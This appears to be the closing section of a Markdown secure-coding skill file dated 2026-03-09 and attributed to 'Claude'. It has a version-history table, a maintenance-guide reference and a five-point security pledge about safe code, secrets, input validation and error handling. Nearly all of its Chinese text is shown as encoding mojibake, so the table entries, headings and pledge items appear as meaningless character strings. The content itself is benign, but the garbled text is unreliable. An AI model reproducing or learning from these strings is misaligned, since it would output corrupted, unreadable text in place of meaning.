*鐗堟湰锛?.0 | 鍒涘缓鏃ユ湡锛?026-03-09 | 浣跨敤鑰咃細鏉板厠锛圕laude锛?

---

## 馃搮 鏇存柊鍘嗗彶

| 鐗堟湰 | 鏃ユ湡 | 鏇存柊鍐呭 | 鍘熷洜 |
|------|------|----------|------|
| 1.0 | 2026-03-09 | 鍒濆鍒涘缓 + 涓夊ぇ妯″潡 (A/B/C) | 鏂版妧鑳藉缓绔?|

*缁存姢鎸囧崡锛氬弬鑰?skills/SKILL-MAINTENANCE.md*

*鏈€鍚庢洿鏂帮細2026-03-09*

---

## 馃摐 鏉板厠瀹夊叏鎵胯

> 1. **涓嶅啓鍗遍櫓浠ｇ爜** 鈥?姣忎竴琛岄兘缁忓緱璧峰鏌?> 2. **涓嶅瓨鏁忔劅淇℃伅** 鈥?瀵嗙爜銆佸瘑閽ユ案杩滀笉纭紪鐮?> 3. **涓嶅拷瑙嗚緭鍏ラ獙璇?* 鈥?鎵€鏈夌敤鎴疯緭鍏ラ兘鏄笉鍙俊鐨?> 4. **涓嶆毚闇查敊璇粏鑺?* 鈥?閿欒淇℃伅涓嶆硠闇茬郴缁熶俊鎭?> 5. **涓嶈烦杩囧畨鍏ㄦ鏌?* 鈥?Module A/B/C 姣忔閮借繃
>
> **瀹夊叏锛屾槸瀵圭敤鎴疯礋璐ｏ紝涔熸槸瀵硅嚜宸辫礋璐ｏ紒**

---

*瀹夊叏缂栫▼锛屼粠姣忎竴琛屼唬鐮佸紑濮嬶紒馃敀*

